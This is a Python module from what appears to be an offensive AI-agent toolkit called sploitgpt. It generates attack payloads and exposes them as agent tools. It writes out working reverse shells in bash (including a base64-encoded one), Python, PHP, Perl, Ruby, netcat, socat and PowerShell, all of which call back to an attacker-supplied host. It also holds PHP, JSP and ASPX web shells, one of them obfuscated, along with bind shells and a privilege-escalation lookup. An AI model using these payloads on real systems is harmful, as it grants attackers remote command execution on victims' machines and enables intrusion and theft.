"""
Payload Generation

Common payloads for reverse shells, bind shells, and web shells.
"""

import base64
import ipaddress
import logging
from collections.abc import Callable, Iterable
from dataclasses import dataclass

logger = logging.getLogger(__name__)

from sploitgpt.tools import register_tool


@dataclass
class Payload:
    """A payload with metadata."""

    name: str
    language: str
    payload: str
    description: str
    requires: list[str] | None = None  # Required binaries/features


def bash_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate bash reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return Payload(
        name="bash_reverse",
        language="bash",
        payload=payload,
        description=f"Bash reverse shell to {lhost}:{lport}",
        requires=["bash", "/dev/tcp"],
    )


def bash_reverse_shell_encoded(lhost: str, lport: int) -> Payload:
    """Generate base64 encoded bash reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    raw = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(raw.encode()).decode()
    payload = f"echo {encoded} | base64 -d | bash"
    return Payload(
        name="bash_reverse_b64",
        language="bash",
        payload=payload,
        description=f"Base64 encoded bash reverse shell to {lhost}:{lport}",
        requires=["bash", "base64"],
    )


def python_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate Python reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    return Payload(
        name="python_reverse",
        language="python",
        payload=payload,
        description=f"Python reverse shell to {lhost}:{lport}",
        requires=["python3"],
    )


def php_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate PHP reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' '''
    return Payload(
        name="php_reverse",
        language="php",
        payload=payload,
        description=f"PHP reverse shell to {lhost}:{lport}",
        requires=["php"],
    )


def perl_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate Perl reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
    return Payload(
        name="perl_reverse",
        language="perl",
        payload=payload,
        description=f"Perl reverse shell to {lhost}:{lport}",
        requires=["perl"],
    )


def ruby_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate Ruby reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
    return Payload(
        name="ruby_reverse",
        language="ruby",
        payload=payload,
        description=f"Ruby reverse shell to {lhost}:{lport}",
        requires=["ruby"],
    )


def nc_reverse_shell(lhost: str, lport: int, e_flag: bool = True) -> Payload:
    """Generate netcat reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    if e_flag:
        payload = f"nc -e /bin/sh {lhost} {lport}"
    else:
        # For nc without -e (most systems)
        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

    return Payload(
        name="nc_reverse",
        language="shell",
        payload=payload,
        description=f"Netcat reverse shell to {lhost}:{lport}",
        requires=["nc"] if e_flag else ["nc", "mkfifo"],
    )


def socat_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate socat reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f"socat TCP:{lhost}:{lport} EXEC:/bin/sh"
    return Payload(
        name="socat_reverse",
        language="shell",
        payload=payload,
        description=f"Socat reverse shell to {lhost}:{lport}",
        requires=["socat"],
    )


def powershell_reverse_shell(lhost: str, lport: int) -> Payload:
    """Generate PowerShell reverse shell."""
    if not _validate_lhost_lport(lhost, lport):
        raise ValueError("Invalid lhost/lport")
    payload = f'''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
    return Payload(
        name="powershell_reverse",
        language="powershell",
        payload=payload,
        description=f"PowerShell reverse shell to {lhost}:{lport}",
        requires=["powershell"],
    )


# Web shells
def php_web_shell() -> str:
    """Simple PHP web shell."""
    return '<?php system($_GET["cmd"]); ?>'


def php_web_shell_hidden() -> str:
    """Obfuscated PHP web shell."""
    return '<?php $a="sys"."tem";$a($_GET["x"]); ?>'


def jsp_web_shell() -> str:
    """Simple JSP web shell."""
    return """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream is = p.getInputStream();
    BufferedReader br = new BufferedReader(new InputStreamReader(is));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>"""


def aspx_web_shell() -> str:
    """Simple ASPX web shell."""
    return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if(cmd != null) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>"""


# All reverse shell generators
REVERSE_SHELL_GENERATORS: dict[str, Callable[[str, int], Payload]] = {
    "bash": bash_reverse_shell,
    "bash_b64": bash_reverse_shell_encoded,
    "python": python_reverse_shell,
    "php": php_reverse_shell,
    "perl": perl_reverse_shell,
    "ruby": ruby_reverse_shell,
    "nc": nc_reverse_shell,
    "socat": socat_reverse_shell,
    "powershell": powershell_reverse_shell,
}


def generate_reverse_shells(lhost: str, lport: int) -> list[Payload]:
    """Generate all reverse shell variants."""
    payloads: list[Payload] = []
    for _name, gen in REVERSE_SHELL_GENERATORS.items():
        try:
            payloads.append(gen(lhost, lport))
        except Exception:
            pass
    return payloads


def format_reverse_shells_for_agent(lhost: str, lport: int) -> str:
    """Format reverse shells for the agent."""
    payloads = generate_reverse_shells(lhost, lport)

    lines = [f"**Reverse Shell Payloads (to {lhost}:{lport}):**\n"]

    for p in payloads:
        lines.append(f"**{p.name}** ({p.language})")
        lines.append(f"```{p.language}")
        lines.append(p.payload)
        lines.append("```")
        lines.append("")

    lines.append("**Listener command:**")
    lines.append("```bash")
    lines.append(f"nc -lvnp {lport}")
    lines.append("```")

    return "\n".join(lines)


# Common bind shell ports
def bind_shell_bash(lport: int) -> str:
    """Bash bind shell."""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {lport} >/tmp/f"


def bind_shell_python(lport: int) -> str:
    """Python bind shell."""
    return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{lport}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])' """


def _validate_lhost_lport(lhost: str, lport: int) -> tuple[str, int] | None:
    """Validate host and port inputs to avoid obviously invalid payloads."""
    try:
        ipaddress.ip_address(lhost)
    except ValueError:
        if not lhost or any(ch.isspace() for ch in lhost):
            logger.warning("Invalid lhost provided: %s", lhost)
            return None
    try:
        port_int = int(lport)
        if not (1 <= port_int <= 65535):
            logger.warning("Invalid lport provided: %s", lport)
            return None
    except Exception:
        logger.warning("Invalid lport provided: %s", lport)
        return None
    return lhost, int(lport)


@register_tool("get_shells")
async def get_shells(ip: str, port: int, shells: list[str] | str | None = None) -> str:
    """Return common reverse shell payloads for a given IP/port."""
    _ = shells  # Optional hint for clients; ignored for now.
    validated = _validate_lhost_lport(ip, port)
    if not validated:
        return "Error: invalid lhost/lport. Provide a valid IP/hostname and port (1-65535)."
    lhost, lport = validated
    return format_reverse_shells_for_agent(lhost, lport)


@register_tool("get_privesc")
async def get_privesc(binaries: Iterable[str] | str) -> str:
    """Suggest privilege escalation techniques for provided binaries."""
    if isinstance(binaries, str):
        raw = binaries.replace(",", " ").strip()
        items = [b for b in raw.split() if b]
    else:
        items = [b for b in binaries if b]

    if not items:
        return "Error: no binaries provided."

    from sploitgpt.knowledge.gtfobins import format_privesc_for_agent

    return format_privesc_for_agent(list(items))
